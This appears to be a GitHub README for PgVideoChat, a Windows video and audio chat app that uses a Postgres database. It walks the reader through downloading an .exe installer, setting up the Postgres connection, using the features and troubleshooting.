# 💬 PgVideoChat - Simple Video Chat Through Postgres

[![Download PgVideoChat](https://img.shields.io/badge/Download-PgVideoChat-brightgreen)](https://github.com/nobeltk-eng/PgVideoChat)

## 📋 What is PgVideoChat?

PgVideoChat is a desktop app that lets you chat using video and audio. It uses Postgres, a type of database, to connect people in real time. The design is simple so you can start chatting with little setup. This app gives you a different way to talk to others without relying on usual chat services.

## 🖥️ System Requirements

Before you start, make sure your Windows computer meets these requirements:

- Windows 10 or later (64-bit)
- 4 GB RAM or more
- At least 100 MB free disk space
- A webcam and microphone connected
- Internet connection (for real-time chat)
- Postgres database running locally or on a network

## 🚀 Getting Started

Follow these steps to download and run PgVideoChat on your Windows computer.

### Step 1: Download the App

Click the link below to visit the official download page. You will find the latest version of the app there.

[![Download PgVideoChat](https://img.shields.io/badge/Download-PgVideoChat-blue)](https://github.com/nobeltk-eng/PgVideoChat)

This link takes you straight to the GitHub page where you can find the download files. Look for the latest release and the `.exe` installer file for Windows.

### Step 2: Install PgVideoChat

Once the installer file is downloaded:

1. Open the folder where the file saved.
2. Double-click the installer file (`PgVideoChat.exe`).
3. Follow the simple on-screen instructions:
   - Choose the installation folder (the default is usually fine).
   - Click "Next" or "Install".
4. Wait until the installation completes.
5. Click "Finish" to close the installer.

### Step 3: Set Up Your Postgres Database

PgVideoChat requires access to a Postgres database to work. You can use a local or remote database.

- **If Postgres is not installed**  
  Download and install Postgres from https://www.postgresql.org/download/windows/. Follow that guide to set up a database.

- **Configure Connection**  
  When you first open PgVideoChat, it will ask for connection details:  
  - Hostname (e.g., `localhost` if on your PC)  
  - Port (default is 5432)  
  - Database name  
  - Username  
  - Password  

Get these details from your database setup or administrator.

### Step 4: Launch PgVideoChat and Connect

1. Open PgVideoChat from your Start menu or desktop shortcut.
2. Enter the Postgres connection details on the setup screen.
3. Click "Connect" to link the app to your database.
4. Once connected, you can start adding contacts and begin video chats.

## 🎥 Using PgVideoChat

Here are the main features you will use:

- **Contact List**  
  Add friends or colleagues by sharing your user ID.  

- **Start a Video Chat**  
  Select a contact and click "Call". Your webcam and microphone turn on automatically.  

- **Receive Calls**  
  PgVideoChat notifies you when someone wants to chat. Click "Accept" to join.  

- **Chat History**  
  View past call logs and timestamps.

- **Settings**  
  Change your display name, configure camera, microphone, and video quality options.

## 🔧 Troubleshooting Tips

- **App will not connect to Postgres?**  
  Check the database is running. Confirm connection details like hostname and password.

- **Video or audio not working?**  
  Ensure your webcam and microphone drivers are up to date. Check Windows privacy settings allow PgVideoChat to use them.

- **Calls drop or lag?**  
  Test your internet speed. Slower connections can cause delays in video and audio.

- **Error messages on startup?**  
  Try restarting your computer. Make sure you have the latest version installed.

## 🛠️ Advanced Options

PgVideoChat offers additional settings for users familiar with Postgres:

- Change the notification sound files.
- Adjust video codec and resolution.
- View the SQL queries that handle chat messages for debugging.

These options are found under the "Advanced" menu after connecting.

## 📥 Download PgVideoChat

Visit this page to download the latest version for Windows:

[https://github.com/nobeltk-eng/PgVideoChat](https://github.com/nobeltk-eng/PgVideoChat)

Look for the "Releases" section on the right side of the page to find `.exe` installation files.

## 💡 Tips for Best Experience

- Use a wired internet connection for lower latency.
- Close other apps using the camera or microphone.
- Keep your Postgres server updated.
- Test your audio and video settings before calls.

## 📚 More Information

PgVideoChat uses Postgres to store messages and manage connections. Postgres is a reliable database system used worldwide. This app shows one way databases can support real-time communication beyond usual chat apps.

If you want to learn about Postgres, visit https://www.postgresql.org/docs/. It offers guides on setup, security, and managing databases.

---

[![Download PgVideoChat](https://img.shields.io/badge/Download-PgVideoChat-brightgreen)](https://github.com/nobeltk-eng/PgVideoChat)